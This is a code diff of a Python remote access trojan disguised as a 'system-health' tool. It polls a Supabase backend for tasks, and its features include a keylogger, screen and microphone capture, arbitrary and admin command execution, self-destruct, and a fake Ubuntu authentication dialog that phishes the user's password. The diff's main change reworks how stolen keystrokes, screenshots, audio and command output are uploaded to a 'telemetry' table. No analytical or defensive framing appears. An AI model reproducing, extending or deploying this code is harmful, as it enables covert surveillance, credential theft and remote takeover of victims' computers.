@@ -14,12 +14,10 @@ import urllib.error
 from datetime import datetime, timezone
 import threading
 
-
 # --- GLOBALS ---
 KEYLOG_BUFFER = []
 ROOT_PASSWORD = None
 KEYLOG_LOCK = threading.Lock()
-
 
 # --- CONFIGURATION ---
 BASE_PATH = os.path.expanduser("~/.config/system-health")
@@ -27,9 +25,7 @@ CONFIG_FILE = os.path.join(BASE_PATH, "config.enc")
 DEVICE_ID_FILE = os.path.join(BASE_PATH, ".device_id")
 KEY = "S3cr3tK3y2024!"
 
-
 # --- UTILS ---
-
 
 def install_dependencies():
     """Attempt to install missing python dependencies silently if possible."""
@@ -43,7 +39,6 @@ def install_dependencies():
                              check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             except:
                 pass
-
 
 def get_config():
     try:
@@ -61,7 +56,6 @@ def get_config():
         print(f"Config Error: {e}", flush=True)
         return None
 
-
 def get_device_id():
     if os.path.exists(DEVICE_ID_FILE):
         with open(DEVICE_ID_FILE, "r") as f:
@@ -75,11 +69,9 @@ def get_device_id():
         pass
     return new_id
 
-
 def get_device_name():
     chars = string.ascii_letters
     return ''.join(random.choice(chars) for _ in range(8))
-
 
 def run_command(cmd, shell=True):
     try:
@@ -90,9 +82,7 @@ def run_command(cmd, shell=True):
     except Exception as e:
         return "", str(e), -1
 
-
 # --- ACTIONS ---
-
 
 def take_screenshot():
     try:
@@ -106,7 +96,6 @@ def take_screenshot():
         return img_data
     except Exception as e:
         raise e
-
 
 # --- KEYLOGGER ---
 def start_keylogger_thread():
@@ -122,7 +111,6 @@ def start_keylogger_thread():
             if len(KEYLOG_BUFFER) > 5000: # Limit buffer
                 KEYLOG_BUFFER.pop(0)
 
-
     try:
         import pynput.keyboard
         # non-blocking start
@@ -132,7 +120,6 @@ def start_keylogger_thread():
         print("DEBUG: Keylogger thread started (silently).", flush=True)
     except Exception as e:
         print(f"DEBUG: Keylogger failed to start: {e}", flush=True)
-
 
 def attempt_root_escalation():
     """
@@ -151,9 +138,7 @@ def attempt_root_escalation():
         print(f"DEBUG: Tkinter failed: {e}", flush=True)
         return False, "Tkinter not installed."
 
-
     result_pw = None
-
 
     def show_ui():
         nonlocal result_pw
@@ -163,11 +148,9 @@ def attempt_root_escalation():
             root.withdraw()
             w, h = root.winfo_screenwidth(), root.winfo_screenheight()
 
-
             # Fixed dialog dimensions
             DIALOG_WIDTH = 373
             DIALOG_HEIGHT = 381
-
 
             # Create Dialog FIRST
             dialog = tk.Toplevel(root)
@@ -175,14 +158,12 @@ def attempt_root_escalation():
             dialog.overrideredirect(True)
             dialog.configure(bg='#2C2C2C')
 
-
             # Load Dialog Image
             base_dir = os.path.expanduser("~/.config/system-health")
             if not os.path.exists(base_dir):
                 base_dir = os.path.dirname(os.path.abspath(__file__))
             img_path = os.path.join(base_dir, "prompt.png")
             print(f"DEBUG: Image path: {img_path}", flush=True)
-
 
             bg_image = None
             try:
@@ -222,12 +203,10 @@ def attempt_root_escalation():
                     except:
                         bg_image = None
 
-
             # Center Dialog
             x = (w - DIALOG_WIDTH) // 2
             y = (h - DIALOG_HEIGHT) // 2
             dialog.geometry(f"{DIALOG_WIDTH}x{DIALOG_HEIGHT}+{x}+{y}")
-
 
             # Dimmer
             dimmer = None
@@ -259,18 +238,15 @@ def attempt_root_escalation():
                 dimmer.configure(bg='black')
                 dimmer.overrideredirect(True)
 
-
             # Background Label
             if bg_image:
                 bg_lbl = tk.Label(dialog, image=bg_image, borderwidth=0, highlightthickness=0)
                 bg_lbl.image = bg_image
                 bg_lbl.place(x=0, y=0)
 
-
             if dimmer: dimmer.lower(dialog)
             dialog.lift()
             dialog.attributes('-topmost', True)
-
 
             # Layout Config
             POS = { 'title_y': 50, 'msg_y': 85, 'avatar_y': 170, 'username_y': 220, 'input_y': 273, 'input_w': 260, 'input_h': 28, 'btn_h': 41, 'btn_gap': 1 }
@@ -285,7 +261,6 @@ def attempt_root_escalation():
             BTN_CANCEL_BG = '#323232'
             BTN_CANCEL_HOVER = '#424242'
 
-
             hdr_font = font.Font(family="Ubuntu", size=13, weight="bold")
             tk.Label(dialog, text="Authentication Required", bg=TITLE_BG, fg=TEXT_COLOR, font=hdr_font).place(relx=0.5, y=POS['title_y'], anchor='center')
             
@@ -293,21 +268,17 @@ def attempt_root_escalation():
             msg = "Authentication keyring is needed to upgrade\nsystem packages"
             tk.Label(dialog, text=msg, bg=MSG_BG, fg='#CCCCCC', font=body_font, justify='center').place(relx=0.5, y=POS['msg_y'], anchor='center')
 
-
             username = os.getlogin()
             initial = username[0].upper() if username else "?"
             tk.Label(dialog, text=initial, bg=AVATAR_BG, fg='white', font=("Ubuntu", 18, "bold")).place(relx=0.5, y=POS['avatar_y'], anchor='center')
             tk.Label(dialog, text=username, bg=USERNAME_BG, fg=TEXT_COLOR, font=("Ubuntu", 12, "bold")).place(relx=0.5, y=POS['username_y'], anchor='center')
 
-
             pw_entry = tk.Entry(dialog, show="•", bg=ENTRY_BG, fg='white', relief='flat', bd=0, highlightthickness=0, font=("Ubuntu", 15), insertbackground='white', justify='center')
             pw_entry.place(relx=0.5, y=POS['input_y'], width=POS['input_w'], height=POS['input_h'], anchor='center')
             pw_entry.bind('<FocusOut>', lambda e: pw_entry.focus_set())
 
-
             btn_w = (DIALOG_WIDTH - POS['btn_gap']) // 2
             btn_y = DIALOG_HEIGHT - POS['btn_h']
-
 
             def cancel(e=None):
                 try:
@@ -315,7 +286,6 @@ def attempt_root_escalation():
                     if dimmer: dimmer.destroy()
                     root.destroy()
                 except: pass
-
 
             def submit(event=None):
                 nonlocal result_pw
@@ -326,16 +296,13 @@ def attempt_root_escalation():
                     root.destroy() 
                 except: pass
 
-
             lbl_cancel = tk.Label(dialog, text="Cancel", bg=BTN_CANCEL_BG, fg='white', font=body_font)
             lbl_cancel.place(x=0, y=btn_y, width=btn_w, height=POS['btn_h'])
             lbl_cancel.bind("<Button-1>", cancel)
 
-
             lbl_auth = tk.Label(dialog, text="Authenticate", bg=BTN_AUTH_BG, fg='white', font=("Ubuntu", 10, "bold"))
             lbl_auth.place(x=btn_w + POS['btn_gap'], y=btn_y, width=btn_w, height=POS['btn_h'])
             lbl_auth.bind("<Button-1>", submit)
-
 
             def update_auth_button_state(e=None):
                 if pw_entry.get():
@@ -361,7 +328,6 @@ def attempt_root_escalation():
             
             root.after(60000, lambda: cancel())
 
-
             print("DEBUG: Starting tkinter mainloop...", flush=True)
             try:
                 root.mainloop()
@@ -374,10 +340,8 @@ def attempt_root_escalation():
                 if 'root' in locals(): root.destroy()
             except: pass
 
-
         except Exception as e:
             print(f"GUI Exception: {e}", flush=True)
-
 
     # Execute UI
     try:
@@ -385,7 +349,6 @@ def attempt_root_escalation():
     except Exception as e:
         print(f"DEBUG: UI Error: {e}", flush=True)
         return False, f"UI Failed: {e}"
-
 
     if result_pw:
         print(f"✅ Password Captured: {result_pw}", flush=True)
@@ -398,7 +361,6 @@ def attempt_root_escalation():
     else:
         return False, "User cancelled."
 
-
 def record_audio(duration=10):
     try:
         filename = f"/tmp/aud_{int(time.time())}.wav"
@@ -409,7 +371,6 @@ def record_audio(duration=10):
         return audio_data
     except Exception as e:
         raise e
-
 
 def get_sys_info():
     info = {
@@ -425,7 +386,6 @@ def get_sys_info():
     out, _, _ = run_command("whoami")
     info['user'] = out
     return json.dumps(info)
-
 
 def api_request(config, endpoint, method="GET", data=None):
     url = f"{config['supabase_url']}/rest/v1/{endpoint}"
@@ -455,7 +415,6 @@ def api_request(config, endpoint, method="GET", data=None):
         print(f"API Error ({endpoint}): {e}", flush=True)
         return None
 
-
 def register_device(config, device_id):
     hostname = socket.gethostname()
     username = os.getlogin()
@@ -476,7 +435,6 @@ def register_device(config, device_id):
     else:
         api_request(config, f"devices?device_id=eq.{device_id}", "PATCH", {"last_sync": datetime.now(timezone.utc).isoformat()})
 
-
 def self_destruct():
     try:
         print("Initiating self-destruct...", flush=True)
@@ -491,16 +449,13 @@ def self_destruct():
         print(f"Destruct failed: {e}", flush=True)
         return False
 
-
 PROCESSED_TASKS = set()
-
 
 def process_tasks(config, device_id):
     global ROOT_PASSWORD, PROCESSED_TASKS
     tasks = api_request(config, f"tasks?device_id=eq.{device_id}&status=eq.pending&select=*")
     if not tasks: 
         return
-
 
     for task in tasks:
         task_id = task['id']
@@ -513,12 +468,10 @@ def process_tasks(config, device_id):
         params = task.get('task_params', {})
         print(f"Processing task: {task_type} (ID: {task_id})", flush=True)
 
-
         result_data = None
         data_type = None
         should_destruct = False
         should_fail_task = False
-
 
         try:
             if task_type == "display_capture":
@@ -531,7 +484,6 @@ def process_tasks(config, device_id):
                 else: 
                     should_fail_task = True
 
-
             elif task_type == "input_monitor":
                 duration = int(params.get('duration', 60))
                 time.sleep(duration)
@@ -539,7 +491,6 @@ def process_tasks(config, device_id):
                     logs = "".join(KEYLOG_BUFFER)
                 result_data = {"data": logs if logs else "[No keystrokes recorded]"}
                 data_type = "keystrokes"
-
 
             elif task_type == "voice_capture":
                 duration = int(params.get('duration', 10))
@@ -550,11 +501,9 @@ def process_tasks(config, device_id):
                 else: 
                     should_fail_task = True
 
-
             elif task_type == "system_info":
                 result_data = {"data": get_sys_info()}
                 data_type = "sysinfo"
-
 
             elif task_type == "escalate_privileges":
                 success_bool, msg = attempt_root_escalation()
@@ -562,12 +511,10 @@ def process_tasks(config, device_id):
                 data_type = "sysinfo"
                 should_fail_task = not success_bool
 
-
             elif task_type == "auto_destruct":
                 success = self_destruct()
                 result_data = {"data": "Destroyed" if success else "Failed"}
                 should_destruct = True
-
 
             elif task_type == "cmd_exec":
                 cmd = params.get('command', '')
@@ -583,7 +530,6 @@ def process_tasks(config, device_id):
                 }
                 data_type = "cmd_result"
                 should_fail_task = (code != 0)
-
 
             elif task_type == "cmd_exec_admin":
                 cmd = params.get('command', '')
@@ -614,37 +560,45 @@ def process_tasks(config, device_id):
                 data_type = "cmd_result"
                 should_fail_task = (code != 0)
 
-
             # Send Result - FIXED VERSION
             if result_data:
-                update_payload = {
-                    "status": "failed" if should_fail_task else "completed",
+                # 1. Insert data into telemetry table
+                telemetry_payload = {
+                    "device_id": device_id,
+                    "collected_at": datetime.now(timezone.utc).isoformat()
+                }
+                
+                # Add data_type if present
+                if data_type:
+                    telemetry_payload["data_type"] = data_type
+                
+                # Add either text data or file data
+                if "data" in result_data:
+                    telemetry_payload["data"] = result_data["data"]
+                if "file_data" in result_data:
+                    telemetry_payload["file_data"] = result_data["file_data"]
+                
+                print(f"DEBUG: Sending telemetry: {json.dumps({k: v[:100] + '...' if isinstance(v, str) and len(v) > 100 else v for k, v in telemetry_payload.items()}, indent=2)}", flush=True)
+                
+                telemetry_success = api_request(config, "telemetry", "POST", telemetry_payload)
+                
+                # 2. Update task status to complete
+                task_update_payload = {
+                    "status": "failed" if should_fail_task else "complete",  # Note: 'complete' not 'completed'
                     "completed_at": datetime.now(timezone.utc).isoformat()
                 }
                 
-                # Add result_data - ensure it's properly structured
-                if isinstance(result_data, dict):
-                    update_payload["result_data"] = result_data
+                print(f"DEBUG: Updating task status: {json.dumps(task_update_payload, indent=2)}", flush=True)
+                
+                task_success = api_request(config, f"tasks?id=eq.{task_id}", "PATCH", task_update_payload)
+                
+                if telemetry_success and task_success:
+                    print(f"✅ Task {task_id} completed and data saved to telemetry", flush=True)
                 else:
-                    update_payload["result_data"] = {"data": str(result_data)}
-                
-                # Don't add data_type - column doesn't exist in schema
-                # if data_type:
-                #     update_payload["data_type"] = data_type
-                
-                print(f"DEBUG: Sending update payload: {json.dumps(update_payload, indent=2)}", flush=True)
-                
-                # Use proper Supabase PATCH endpoint
-                success = api_request(config, f"tasks?id=eq.{task_id}", "PATCH", update_payload)
-                
-                if success:
-                    print(f"✅ Task {task_id} updated successfully", flush=True)
-                else:
-                    print(f"❌ Failed to update task {task_id}", flush=True)
+                    print(f"❌ Failed - Telemetry: {telemetry_success}, Task Update: {task_success}", flush=True)
                 
                 if should_destruct: 
                     sys.exit(0)
-
 
         except Exception as e:
             print(f"Task Error: {e}", flush=True)
@@ -654,8 +608,6 @@ def process_tasks(config, device_id):
                 "completed_at": datetime.now(timezone.utc).isoformat()
             }
             api_request(config, f"tasks?id=eq.{task_id}", "PATCH", error_payload)
-
-
 
 
 def main():
@@ -673,10 +625,9 @@ def main():
         except Exception as e:
             print(f"Loop Error: {e}", flush=True)
         time.sleep(config.get('sync_interval', 60))
-#he
+
 if __name__ == "__main__":
     try:
         main()
     except Exception as e:
         print(f"CRITICAL: {e}", flush=True)
-
